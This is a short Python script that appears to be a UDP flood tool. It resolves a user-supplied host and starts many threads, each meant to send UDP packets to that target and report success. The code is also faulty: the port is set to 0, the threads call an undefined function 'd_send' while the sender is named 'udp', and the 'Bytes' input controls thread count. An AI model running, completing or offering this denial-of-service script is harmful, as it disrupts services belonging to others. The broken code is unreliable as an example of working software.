import threading
import socket

ip = socket.gethostbyname(input("IP: "))
byte_s = int(input("Bytes: "))
port = int()

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)


def udp():
    try:
        s.sendto(b'UDP packet', (ip, port))
        print("\033[32m[+]\033[0mUDP Packet sent!")
    except Exception as err:
        print(err)


for i in range(byte_s):
    thread = threading.Thread(target=d_send)
    thread.start()